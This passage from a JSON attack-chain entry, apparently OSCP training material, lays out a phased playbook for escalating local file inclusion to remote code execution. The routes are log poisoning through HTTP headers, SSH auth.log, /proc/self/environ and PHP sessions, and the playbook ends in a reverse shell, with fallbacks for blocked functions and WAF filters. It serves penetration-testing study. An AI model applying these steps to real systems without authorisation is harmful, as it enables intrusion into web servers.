ownership). **Upload Progress Trick:** PHP 5.4+ feature: `session.upload_progress.enabled = On` (default). During file upload, PHP stores progress in session: `upload_progress_<NAME>` with metadata including filename. Filename not sanitized (used for display). Exploit: Upload file with PHP payload as filename. But: Race condition - progress data cleaned after upload completes. Must include session DURING upload (timing critical). **Why Rare in OSCP:** (1) Requires sessions (not all apps use them), (2) Requires user input in session (validation might block), (3) More complex than log poisoning (easier methods usually work first), (4) Low awareness (students often don't think to check sessions). **Advantages:** (1) Bypasses log file permissions (session files owned by same user), (2) Works when /proc restricted, (3) Clean exploitation (no log noise). **OSCP Relevance:** Demonstrates exhaustive methodology - tried logs, tried /proc, trying sessions. Shows deep PHP knowledge (session mechanism, serialization). Rarely needed (<10% of cases) but completes the LFI→RCE playbook. Understanding sessions useful for session fixation attacks, deserialize exploits (different techniques)."
    }
  ],
  "sections": [
    {
      "title": "Phase 1: Prerequisites & Detection (1-2 minutes)",
      "notes": "Before attempting log poisoning, verify LFI exists and enumerate accessible log files. Skipping verification wastes time poisoning unreadable logs. OSCP time management critical - quick yes/no checks before committing to technique.",
      "commands": [
        "lfi-access-log-apache",
        "lfi-access-log-nginx",
        "lfi-auth-log",
        "lfi-proc-environ"
      ]
    },
    {
      "title": "Phase 2: Log Injection (1-2 minutes per target)",
      "notes": "Inject PHP payload into target log file. Choose injection vector based on Phase 1 results: Apache User-Agent (most common), Nginx User-Agent (platform variant), SSH username (alternative), or /proc/self/environ (advanced). Single attempt usually sufficient - no need to repeat poisoning.",
      "commands": [
        "curl-ua-poison-apache",
        "curl-ua-poison-nginx",
        "ssh-authlog-poison"
      ]
    },
    {
      "title": "Phase 3: RCE Trigger & Shell Upgrade (2-3 minutes)",
      "notes": "Trigger code execution via poisoned log file. Start with simple command (whoami, id) to verify RCE, then establish reverse shell. Common pitfall: disable_functions blocking system() - try exec(), passthru(), shell_exec() alternatives. Upgrade to stable PTY for interactive shell (Python pty.spawn). Total attack time: 3-5 minutes for Apache/Nginx, 5-8 minutes for session poisoning.",
      "commands": [
        "lfi-rce-trigger"
      ]
    },
    {
      "title": "Phase 4: Troubleshooting & Alternatives (when standard methods fail)",
      "notes": "Decision tree when primary techniques fail: (1) Apache log denied → Try Nginx path. (2) Both web logs denied → Try SSH auth.log. (3) All logs denied → Try /proc/self/environ. (4) /proc fails → Try session poisoning. (5) Everything fails → Re-check LFI (might be read-only, broken traversal, or false positive). Alternative headers: If User-Agent blocked by WAF, try Referer (-e flag) or custom headers (-H). Alternative functions: system() → exec() → passthru() → shell_exec() → popen(). Understanding failure modes demonstrates methodology over memorization.",
      "commands": [
        "lfi-proc-environ",
        "ssh-authlog-poison"
      ]
    }
  ],
  "tags": [
    "web",
    "lfi",
    "rce",
    "log-poisoning",
    "apache",
    "nginx",
    "ssh",
    "proc",
    "oscp",
    "privilege-escalation"
  ]
}
